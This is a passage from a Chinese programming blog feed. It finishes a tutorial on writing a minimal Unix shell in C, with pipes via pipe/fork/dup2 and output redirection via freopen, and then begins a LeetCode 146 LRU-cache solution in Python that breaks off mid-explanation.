<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    wpid = waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line">&#125;<span class="keyword">while</span> (!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status));</span><br></pre></td></tr></table></figure>

<p>使用do……while结构，判断条件为</p>
<p>​                <code>!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status)</code></p>
<p>WIFEXITED(status) 这个宏用来指出子进程是否为正常退出的，如果是，它会返回一个非零值。</p>
<p>WIFSIGNALED(status)若子进程返回的状态为异常结束,则为真。</p>
<p>则对于父进程来说，子进程无论正常或者异常退出，循环语句都会跳出。</p>
<h2 id="管道-匿名管道"><a href="#管道-匿名管道" class="headerlink" title="管道(匿名管道)"></a>管道(匿名管道)</h2><p>​        上述对shell程序的构建已经可以组成一个简单的shell程序了，有了命令的读入，命令的分析，以及命令的执行。但是对于一个成熟的shell，比如bash，zsh等，都会有管道功能，现在让我们实现管道功能。</p>
<p>​        <strong>什么是管道：</strong></p>
<blockquote>
<p>Shell的一种功能，就是可以将两个或者多个命令（程序或者进程）连接到一起，把一个命令的输出作为下一个命令的输入，以这种方式连接的两个或者多个命令就形成了<strong>管道（pipe）</strong>。</p>
</blockquote>
<p><img src="https://s2.ax1x.com/2020/01/19/1Cjs5d.png" alt="1Cjs5d.png"></p>
<p>Linux 管道使用竖线 | 连接多个命令，这被称为管道符。Linux 管道的具体语法格式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">command1 | command2</span><br><span class="line">command1 | command2 | commandN...</span><br></pre></td></tr></table></figure>

<p>当在两个命令之间设置管道时，管道符 | 左边命令的输出就变成了右边命令的输入。只要第一个命令向标准输出写入，而第二个命令是从标准输入读取，那么这两个命令就可以形成一个管道。大部分的 Linux 命令都可以用来形成管道。</p>
<blockquote>
<p>这里需要注意，command1 必须有正确输出，而 command2 必须可以处理 command2 的输出结果；而且 command2 只能处理 command1 的正确输出结果，不能处理 command1 的错误信息。</p>
</blockquote>
<p><strong>管道机制：</strong></p>
<p>在Linux中，管道是一种使用非常频繁的通信机制。从本质上说，管道也是一种文件，但它又和一般的文件有所不同，管道可以克服使用文件进行通信的两个问题，具体表现为：</p>
<ol>
<li>限制管道的大小。实际上，管道是一个固定大小的缓冲区。在Linux中，该缓冲区的大小为1页，即4K字节，使得它的大小不象文件那样不加检验地增长。使用单个固定缓冲区也会带来问题，比如在写管道时可能变满，当这种情况发生时，随后对管道的write()调用将默认地被阻塞，等待某些数据被读取，以便腾出足够的空间供write()调用写。</li>
<li>读取进程也可能工作得比写进程快。当所有当前进程数据已被读取时，管道变空。当这种情况发生时，一个随后的read()调用将默认地被阻塞，等待某些数据被写入，这解决了read()调用返回文件结束的问题。</li>
</ol>
<p>注意：从管道读数据是一次性操作，数据一旦被读，它就从管道中被抛弃，释放空间以便写更多的数据。</p>
<p><strong>管道的实现：</strong></p>
<p>注意：我只实现了两条命令的管道机制，但是可以通过递归实现n条命令的管道，那样比较繁琐和抽象。</p>
<p>首先，让我们要对命令的读取加上对管道的识别：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>); i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">line</span>[i] == <span class="string">'|'</span> &amp;&amp; <span class="built_in">line</span>[i+<span class="number">1</span>] == <span class="string">' '</span> &amp;&amp; <span class="built_in">line</span>[i<span class="number">-1</span>] == <span class="string">' '</span>)&#123;</span><br><span class="line">            sample = commandwithpipe(<span class="built_in">line</span>);</span><br><span class="line">            <span class="keyword">return</span> sample;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中commandwithpipe()是用来执行管道命令的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commandwithpipe</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">line</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipeIdx;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>); ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">line</span>[i] == <span class="string">'|'</span> &amp;&amp; <span class="built_in">line</span>[i+<span class="number">1</span>] == <span class="string">' '</span> &amp;&amp; <span class="built_in">line</span>[i<span class="number">-1</span>] == <span class="string">' '</span>) &#123;</span><br><span class="line">            pipeIdx = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pipeIdx+<span class="number">2</span> == <span class="built_in">strlen</span>(<span class="built_in">line</span>)) &#123; <span class="comment">// 管道命令' | '后续没有指令，参数缺失</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Parameters are missing\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fds[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (pipe(fds) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">// 子进程执行单个命令</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">        dup2(fds[<span class="number">1</span>], STDOUT_FILENO); <span class="comment">// 将标准输出重定向到fds[1]</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">char</span> *new_str = cut_str(<span class="number">0</span>,pipeIdx<span class="number">-2</span>,<span class="built_in">line</span>);</span><br><span class="line">        <span class="keyword">char</span> **simple_line = cut_line(new_str);</span><br><span class="line">        <span class="keyword">if</span> (execute(simple_line) != <span class="number">1</span>)&#123;</span><br><span class="line">            result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(new_str);</span><br><span class="line">        <span class="built_in">free</span>(simple_line);</span><br><span class="line">        <span class="built_in">exit</span>(result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 父进程递归执行后续命令</span></span><br><span class="line">        <span class="keyword">int</span> status;</span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">        dup2(fds[<span class="number">0</span>], STDIN_FILENO); <span class="comment">// 将标准输入重定向到fds[0]</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">char</span> *new_str = cut_str(pipeIdx + <span class="number">2</span>,<span class="built_in">strlen</span>(<span class="built_in">line</span>),<span class="built_in">line</span>);</span><br><span class="line">        <span class="keyword">char</span> **simple_line = cut_line(new_str);</span><br><span class="line">        result = execute(simple_line);</span><br><span class="line">        <span class="built_in">free</span>(new_str);</span><br><span class="line">        <span class="built_in">free</span>(simple_line);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>commandwithpipe()函数中调用的cut_str()是将管道命令里面的两个命令切割下来：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">cut_str</span><span class="params">(<span class="keyword">int</span> left,<span class="keyword">int</span> right,<span class="keyword">char</span> *<span class="built_in">line</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">512</span>;</span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">buffer</span> = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">buffer</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"allocation error7\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = left; i &lt;= right; i++)&#123;</span><br><span class="line">        <span class="built_in">buffer</span>[j] = <span class="built_in">line</span>[i];</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">buffer</span>[j] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">buffer</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建管道主要用到pipe函数，pipe的原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe</span><span class="params">(<span class="keyword">int</span> fds[<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></table></figure>

<p>参数：一个整型数组，管道创建成功后，<strong>fds[0]表示管道的读端，fds[1]表示管道的写端</strong>。</p>
<p>成功返回0，失败返回-1。</p>
<p>如何用管道来实现进程间通讯，我们可以用以下的例子来实现以下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fds[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">//1.创建管道</span></span><br><span class="line">    <span class="keyword">if</span>(pipe(fds)==<span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">"pipe"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2.fork子进程</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;        <span class="comment">//father</span></span><br><span class="line">        <span class="comment">//3.父进程关闭读端,向写端写入数据</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">char</span> buff[<span class="number">1024</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"parent to child#"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>); <span class="comment">//清空标准输出缓冲区</span></span><br><span class="line">        <span class="keyword">ssize_t</span> s = <span class="built_in">read</span>(<span class="number">0</span>,buff,<span class="keyword">sizeof</span>(buff)<span class="number">-1</span>);</span><br><span class="line">        buff[s<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">write</span>(fds[<span class="number">1</span>],buff,s);</span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;   <span class="comment">//child</span></span><br><span class="line">        <span class="comment">//3.子进程关闭写端,从读端读出数据</span></span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">char</span> buff[<span class="number">1024</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">ssize_t</span> s = <span class="built_in">read</span>(fds[<span class="number">0</span>],buff,<span class="keyword">sizeof</span>(buff));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"child to receive#%s\n"</span>,buff);</span><br><span class="line">        <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        perror(<span class="string">"fork"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>); <span class="comment">//回收子进程</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：read和write函数的一个参数，是一个无符号整数，是<strong>文件描述符</strong>，用来表示一个文件。在Linux系统中，一切设备都看作文件。而每打开一个文件，就有一个代表该打开文件的文件描述符。程序启动时默认打开三个I/O设备文件：标准输入文件stdin，标准输出文件stdout，标准错误输出文件stderr，分别得到文件描述符 0, 1, 2。</p>
<p><strong>上述程序的功能是，父进程从标准输入读入，并且从管道写端fds[1]写入到管道中，子进程从管道读端fds[0]读出数据，并且输出到标准输出中，默认为屏幕。</strong></p>
<p>注意：上述程序并没有对父子进程的先后顺序做以处理，不过管道会自然实现，因为当管道中没有数据时，读取管道的进程，也就是父进程会被阻塞，等待管道中数据的写入。同时管道类似于通信中半双工信道的进程通信机制，一个管道可以实现双向的数据传输，而同一个时刻只能最多有一个方向的传输，不能两个方向同时进行。</p>
<p>现在在明白管道的原理，功能，以及使用后，让我们回头看看commandwithpipe()函数。</p>
<p>在函数中，我们对管道命令做了处理，使用fork分开执行，首先让子进程的标准输出重定向为管道写端fds[1]，然后使用execute()执行第一条命令语句。对于父程序，我们在等待子进程执行完后，先将标准输入重定向为管道读端fds[0]，然后用execute()执行第二条命令语句。</p>
<p>注意：我们在父进程中将标准输入进行了重定位，所以在执行完毕后要将其重定回来。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> s_fd_out = dup(STDOUT_FILENO); <span class="comment">//保存标准输出</span></span><br><span class="line"><span class="keyword">int</span> s_fd_in = dup(STDIN_FILENO);<span class="comment">//保存标准输入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n_fd_out = dup2(s_fd_out , STDOUT_FILENO);<span class="comment">//恢复标准输出</span></span><br><span class="line"><span class="keyword">int</span> n_fd_in = dup2(s_fd_in,STDIN_FILENO);<span class="comment">//恢复标准输入</span></span><br></pre></td></tr></table></figure>

<p>我们在上述中用到了dup()以及dup2()函数，让我们来介绍一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup</span><span class="params">(<span class="keyword">int</span> oldfd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup2</span><span class="params">(<span class="keyword">int</span> oldfd, <span class="keyword">int</span> newfd)</span></span>;</span><br></pre></td></tr></table></figure>

<p>​        当调用dup函数时，内核在进程中创建一个新的文件描述符，此描述符是当前可用文件描述符的最小数值，这个文件描述符指向oldfd所拥有的文件表项。<br>　　dup2和dup的区别就是可以用newfd参数指定新描述符的数值，如果newfd已经打开，则先将其关闭。如果newfd等于oldfd，则dup2返回newfd, 而不关闭它。dup2函数返回的新文件描述符同样与参数oldfd共享同一文件表项。</p>
<p>现在我们构造好了一个简易的管道功能：</p>
<p><img src="https://s2.ax1x.com/2020/01/20/1iUa0s.png" alt="1iUa0s.png"></p>
<h2 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h2><p>一般情况下，每个 Linux 命令运行时都会打开三个文件：</p>
<ul>
<li>标准输入文件(stdin)：stdin的文件描述符为0，Linux程序默认从stdin读取数据。</li>
<li>标准输出文件(stdout)：stdout 的文件描述符为1，Linux程序默认向stdout输出数据。</li>
<li>标准错误文件(stderr)：stderr的文件描述符为2，Linux程序会向stderr流中写入错误信息。</li>
</ul>
<p>默认情况下，command &gt; file 将 stdout 重定向到 file，command &lt; file 将stdin 重定向到 file。</p>
<p>在我们程序中，鉴于我的技术有限，仅能实现输出重定向’&gt;’。</p>
<p>首先我们得有对输出重定向命令的识别，它将加载在execute_line()函数中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>); j++)&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">line</span>[j] == <span class="string">'&gt;'</span>)&#123;</span><br><span class="line">     	sample = commandWithRedi(<span class="built_in">line</span>);</span><br><span class="line">  	    <span class="keyword">return</span> sample;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后对commandWithRedi()函数进行实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commandWithRedi</span><span class="params">(<span class="keyword">char</span>* <span class="built_in">line</span>)</span> </span>&#123; <span class="comment">//可能含有重定向</span></span><br><span class="line">    <span class="keyword">int</span> outNum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *outFile = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> endIdx = <span class="built_in">strlen</span>(<span class="built_in">line</span>); <span class="comment">// 指令在重定向前的终止下标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">line</span>[i] == <span class="string">'&gt;'</span>) &#123; <span class="comment">// 输出重定向</span></span><br><span class="line">            outNum++;</span><br><span class="line">            <span class="keyword">if</span> (i+<span class="number">1</span> &lt; <span class="built_in">strlen</span>(<span class="built_in">line</span>))</span><br><span class="line">                outFile = &amp;<span class="built_in">line</span>[i+<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Parameters are missing\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            endIdx = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 处理重定向 */</span></span><br><span class="line">    <span class="keyword">if</span> (outNum &gt; <span class="number">1</span>) &#123; <span class="comment">// 输出重定向符超过一个</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Output redirection more than one\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 输入输出重定向 */</span></span><br><span class="line">        <span class="keyword">if</span> (outNum == <span class="number">1</span>)&#123;</span><br><span class="line">            freopen(outFile, <span class="string">"w"</span>, <span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 执行命令 */</span></span><br><span class="line">        <span class="built_in">line</span>[endIdx] = <span class="string">'\0'</span>;</span><br><span class="line">        <span class="keyword">char</span>** char_list = cut_line(<span class="built_in">line</span>);</span><br><span class="line">        <span class="keyword">int</span> stute = execvp(char_list[<span class="number">0</span>], char_list);</span><br><span class="line">        <span class="built_in">free</span>(char_list);</span><br><span class="line">        <span class="keyword">if</span> (stute == <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);<span class="comment">//子进程报错后销毁，返回父进程</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> status;</span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> err = WEXITSTATUS(status); <span class="comment">// 读取子进程的返回码</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (err) &#123; </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, strerror(err));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在函数中我们用字符指针onFile对输出重定向的文件名进行标记，同时用到endIdx作为哨兵，记录重定向符&gt;的位置，并在该位置上赋值’\0’，对执行命令的处理，用到freopen对标准输入stdout以写的方式重定向到onFile处。</p>
<p>实现：</p>
<p><img src="https://s2.ax1x.com/2020/01/22/1EEFbD.png" alt="1EEFbD.png"></p>
<p>同时在1.txt文件中：</p>
<p><img src="https://s2.ax1x.com/2020/01/22/1EE3Vg.png" alt="1EE3Vg.png"></p>
<p>则上述就简单实现了输出重定向功能。</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解146</title>
    <url>/2020/01/21/LeetCode%E9%A2%98%E8%A7%A3146/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第146题 LRU缓存机制</strong></p>
<p>运用你所掌握的数据结构，设计和实现一个  LRU (最近最少使用) 缓存机制。它应该支持以下操作： 获取数据 get 和 写入数据 put 。</p>
<p>获取数据 get(key) - 如果密钥 (key) 存在于缓存中，则获取密钥的值（总是正数），否则返回 -1。<br>写入数据 put(key, value) - 如果密钥不存在，则写入其数据值。当缓存容量达到上限时，它应该在写入新数据之前删除最近最少使用的数据值，从而为新的数据值留出空间。</p>
<p>进阶:</p>
<p>你是否可以在 O(1) 时间复杂度内完成这两种操作？</p>
<p>示例:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LRUCache cache = <span class="keyword">new</span> LRUCache( <span class="number">2</span> <span class="comment">/* 缓存容量 */</span> );</span><br><span class="line"></span><br><span class="line">cache.<span class="built_in">put</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">cache.<span class="built_in">put</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">1</span>);       <span class="comment">// 返回  1</span></span><br><span class="line">cache.<span class="built_in">put</span>(<span class="number">3</span>, <span class="number">3</span>);    <span class="comment">// 该操作会使得密钥 2 作废</span></span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">2</span>);       <span class="comment">// 返回 -1 (未找到)</span></span><br><span class="line">cache.<span class="built_in">put</span>(<span class="number">4</span>, <span class="number">4</span>);    <span class="comment">// 该操作会使得密钥 1 作废</span></span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">1</span>);       <span class="comment">// 返回 -1 (未找到)</span></span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">3</span>);       <span class="comment">// 返回  3</span></span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">4</span>);       <span class="comment">// 返回  4</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">new_node</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,key=<span class="number">0</span>,value=<span class="number">0</span>)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.value = value</span><br><span class="line">        self.prev = <span class="literal">None</span></span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_none</span><span class="params">(self,node)</span>:</span></span><br><span class="line">        node.prev = self.head</span><br><span class="line">        node.next = self.head.next</span><br><span class="line">        self.head.next.prev = node</span><br><span class="line">        self.head.next = node</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_node</span><span class="params">(self,node)</span>:</span></span><br><span class="line">        prev = node.prev</span><br><span class="line">        new = node.next</span><br><span class="line">        prev.next = new</span><br><span class="line">        new.prev = prev</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_to_head</span><span class="params">(self,node)</span>:</span></span><br><span class="line">        self.remove_node(node)</span><br><span class="line">        self.add_none(node) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_last_node</span><span class="params">(self)</span>:</span></span><br><span class="line">        last = self.tail.prev</span><br><span class="line">        self.remove_node(last)</span><br><span class="line">        <span class="keyword">return</span> last</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, capacity)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type capacity: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.cache = &#123;&#125;</span><br><span class="line">        self.size = <span class="number">0</span></span><br><span class="line">        self.capacity = capacity</span><br><span class="line">        self.head = new_node()</span><br><span class="line">        self.tail = new_node()</span><br><span class="line">        self.head.next = self.tail</span><br><span class="line">        self.tail.prev = self.head</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type key: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        node = self.cache.get(key)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">        self.move_to_head(node)</span><br><span class="line">        <span class="keyword">return</span> node.value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, key, value)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type key: int</span></span><br><span class="line"><span class="string">        :type value: int</span></span><br><span class="line"><span class="string">        :rtype: None</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        node = self.cache.get(key)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">            newnode = new_node(key,value)</span><br><span class="line">            self.cache[key] = newnode</span><br><span class="line">            self.add_none(newnode)</span><br><span class="line">            self.size += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> self.size &gt; self.capacity:</span><br><span class="line">                tail = self.remove_last_node()</span><br><span class="line">                <span class="keyword">del</span> self.cache[tail.key]</span><br><span class="line">                self.size -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            node.value = value</span><br><span class="line">            self.move_to_head(node)</span><br><span class="line"><span class="comment"># Your LRUCache object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = LRUCache(capacity)</span></span><br><span class="line"><span class="comment"># param_1 = obj.get(key)</span></span><br><span class="line"><span class="comment"># obj.put(key,value)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/21/1k30Mj.png" alt="1k30Mj.png"></p>
<p><strong>解析：</strong></p>
<p>首先，我们看到这个题所要构建的数据结构要求要在常数时间内完成get和put操作，那么可以用到哈希表，也就是python中的字典结构，辅助双向链表记录key-value信息，对于双向链表加入head和tail两个哨兵方便使用。</p>
<p>整体结构为：</p>
<p><img src="https://s2.ax1x.com/2020/01/21/1kc46s.png" alt="1kc46s.png"></p>
<p>我们先构造链表结构：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">new_node</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,key=<span class="number">0</span>,value=<span class="number">0</span>)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.value = value</span><br><span class="line">        self.prev = <span class="literal">None</span></span><br><span class="line">        self.next = <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>对于字典结构key值是数据结构中的key，而字典中的value是链表中的结构体Node。</p>
<p>在我们构造LRUcache之前，我们先得构造几种方法，并结合要求使用。</p>
<p>首先，LRU是最近最久未使用，我们可以用双向链表进行对使用时间进行有序排序，即最近到最久的顺序。链表中最后一个，也就是最久没有使用的那一个。</p>
<p>对双向链表进行维护时，会有多种情况：</p>
<ol>
<li><p><strong>put</strong>一个key相同的key-value，我们不用管它们的value是否相同，对我们而言是要原来的key-value进行更新，我们要将原来的key-value<strong>更新后将其位置移动到第一个</strong>。这时候无论cache是否满的，都不会溢出，因为只是更新处理而已。</p>
</li>
